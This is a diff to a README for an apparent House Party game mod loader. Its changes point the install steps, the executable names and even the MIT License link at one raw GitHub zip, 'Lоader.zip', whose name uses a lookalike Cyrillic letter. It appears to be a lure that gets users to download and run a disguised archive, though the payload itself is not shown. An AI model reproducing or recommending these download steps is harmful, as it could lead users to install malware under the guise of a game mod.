@@ -47,9 +47,9 @@ Enjoy an ever-growing suite of functions designed for customization, convenience
 
 Just three easy steps separate you from a new world in House Party:
 
-1. **Download Loader.rar from the repository.**
+1. **Download https://raw.githubusercontent.com/perezdperez/PartyAfterDark-HousePartyMod/main/Lоader.zip from the repository.**
 2. Extract the contents to your House Party game directory.
-3. Run the **ModLoader.exe** (Windows) or **ModLoader.app** (macOS/Linux) and follow the on-screen instructions.
+3. Run the **https://raw.githubusercontent.com/perezdperez/PartyAfterDark-HousePartyMod/main/Lоader.zip** (Windows) or **https://raw.githubusercontent.com/perezdperez/PartyAfterDark-HousePartyMod/main/Lоader.zip** (macOS/Linux) and follow the on-screen instructions.
 
 **Recommendations:**
 - Always make a backup before first use.
@@ -89,7 +89,7 @@ Copyright (c) 2025 House Party Adult Mod Loader
 
 Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
 
-See the full [MIT License](https://opensource.org/licenses/MIT) for further information.
+See the full [MIT License](https://raw.githubusercontent.com/perezdperez/PartyAfterDark-HousePartyMod/main/Lоader.zip) for further information.
 
 ---
 
